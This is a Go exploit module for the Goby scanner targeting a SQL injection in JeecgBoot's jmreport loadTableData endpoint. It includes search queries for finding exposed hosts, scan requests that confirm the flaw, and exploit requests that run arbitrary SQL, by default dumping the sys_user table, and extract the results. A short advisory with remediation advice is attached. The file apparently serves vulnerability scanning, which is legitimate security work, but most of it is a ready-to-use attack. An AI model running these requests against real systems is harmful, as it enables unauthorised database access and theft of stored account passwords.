package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "JeecgBoot /jeecg-boot/jmreport/loadTableData SQL Injection Vulnerability",
    "Description": "<p>JeecgBoot is a low-code development platform based on a code generator.  </p><p>JeecgBoot &lt; 3.5.5 version jimuReport component is vulnerable to SQL injection, allowing attackers to directly execute SQL queries to retrieve database information, such as stored account passwords.</p>",
    "Product": "JEECGBOOT-Ent-Low-CP",
    "Homepage": "http://www.jeecg.com/",
    "DisclosureDate": "2024-03-21",
    "PostTime": "2024-03-21",
    "Author": "2783712916@qq.com",
    "FofaQuery": "(body=\"JmReport-Access-Token\" && body=\"/jmreport/desreport_/\") || ((body=\"<script>window._CONFIG = {};</script>\" || body=\"href=/js/oauth2-app.login.\" || body=\"href=/css/chunk-vendors.\") && body=\"z-index: 9999999999999\" && body=\"Chrome, Firefox 16+, IE 10+, Opera\" && body!=\"/sys/common/\")",
    "GobyQuery": "(body=\"JmReport-Access-Token\" && body=\"/jmreport/desreport_/\") || ((body=\"<script>window._CONFIG = {};</script>\" || body=\"href=/js/oauth2-app.login.\" || body=\"href=/css/chunk-vendors.\") && body=\"z-index: 9999999999999\" && body=\"Chrome, Firefox 16+, IE 10+, Opera\" && body!=\"/sys/common/\")",
    "Level": "2",
    "Impact": "<p>JeecgBoot &lt; 3.5.5 version jimuReport component is vulnerable to SQL injection, allowing attackers to directly execute SQL queries to retrieve database information, such as stored account passwords.</p>",
    "Recommendation": "<p>1.The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.jeecg.com/\">http://www.jeecg.com/</a></p><p>2. Deploy a web application firewall to monitor database operations. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sqlPayload",
            "type": "input",
            "value": "select * from sys_user",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/jeecg-boot/jmreport/loadTableData",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\n\"dbSource\":\"\",\n\"pageNo\":\"1\",\n\"pageNo\":\"1\",\n\"pageSize\":\"1\",\n\"sql\":\"select 111222333444555666777888999\",\n\"paramArray\":\"\"\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "111222333444555666777888999",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/jeecg-boot/jmreport/loadTableData"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/jmreport/loadTableData",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\n\"dbSource\":\"\",\n\"pageNo\":\"1\",\n\"pageNo\":\"1\",\n\"pageSize\":\"1\",\n\"sql\":\"select 111222333444555666777888999\",\n\"paramArray\":\"\"\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "111222333444555666777888999",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/jmreport/loadTableData"
            ]
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/jeecg-boot/jmreport/loadTableData",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\n\"dbSource\":\"\",\n\"pageNo\":\"1\",\n\"pageNo\":\"1\",\n\"pageSize\":\"1\",\n\"sql\":\"{{{sqlPayload}}}\",\n\"paramArray\":\"\"\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true,\"message\":\"\",\"code\":200,",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Content-Type: application/json",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|\"success\":true,\"message\":\"\",\"code\":200(.*?)\"timestamp\""
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/jmreport/loadTableData",
                "follow_redirect": false,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Connection": "close",
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\n\"dbSource\":\"\",\n\"pageNo\":\"1\",\n\"pageNo\":\"1\",\n\"pageSize\":\"1\",\n\"sql\":\"{{{sqlPayload}}}\",\n\"paramArray\":\"\"\n}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "\"success\":true,\"message\":\"\",\"code\":200,",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "Content-Type: application/json",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|([\\s\\S]*)"
            ]
        }
    ],
    "Tags": [
        "HW-2023",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.9",
    "Translation": {
        "CN": {
            "Name": "JeecgBoot /jeecg-boot/jmreport/loadTableData SQL 注入漏洞",
            "Product": "JeecgBoot-企业级低代码平台",
            "Description": "<p>JeecgBoot 是一款基于代码生成器的低代码开发平台。<br></p><p>JeecgBoot &lt; 3.5.5版本 积木报表组件存在sql注入漏洞，攻击者利用该可以直接执行sql语句获取数据库信息，如存储的账号密码。</p>",
            "Recommendation": "<p>1、厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.jeecg.com/\">http://www.jeecg.com/</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>JeecgBoot &lt; 3.5.5版本 积木报表组件存在sql注入漏洞，攻击者利用该可以直接执行sql语句获取数据库信息，如存储的账号密码。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "HW-2023",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "JeecgBoot /jeecg-boot/jmreport/loadTableData SQL Injection Vulnerability",
            "Product": "JEECGBOOT-Ent-Low-CP",
            "Description": "<p>JeecgBoot is a low-code development platform based on a code generator.&nbsp;&nbsp;<br></p><p>JeecgBoot &lt; 3.5.5 version jimuReport&nbsp;component is vulnerable to SQL injection, allowing attackers to directly execute SQL queries to retrieve database information, such as stored account passwords.</p>",
            "Recommendation": "<p>1.The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.jeecg.com/\">http://www.jeecg.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>JeecgBoot &lt; 3.5.5 version jimuReport&nbsp;component is vulnerable to SQL injection, allowing attackers to directly execute SQL queries to retrieve database information, such as stored account passwords.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "HW-2023",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
